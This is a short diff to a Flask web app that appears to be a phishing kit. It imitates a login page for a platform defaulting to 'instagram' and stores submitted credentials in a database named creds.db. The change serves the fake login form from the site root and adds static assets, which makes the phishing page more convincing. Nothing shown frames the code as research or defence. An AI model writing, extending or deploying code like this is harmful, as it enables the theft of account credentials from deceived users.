@@ -5,7 +5,7 @@ import os
 import sys
 from datetime import datetime
 
-app = Flask(__name__, template_folder='app/templates')
+app = Flask(__name__, template_folder='app/templates', static_folder='app/static')
 PLATFORM = sys.argv[1] if len(sys.argv) > 1 else "instagram"
 
 DB_PATH = os.path.join(os.getcwd(), '../creds.db')
@@ -14,7 +14,7 @@ if not os.path.exists(DB_PATH):
     raise FileNotFoundError(f"[ERROR] Did not find data base at {DB_PATH}")
 
 
-@app.route('/login', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         email = request.form.get('email')
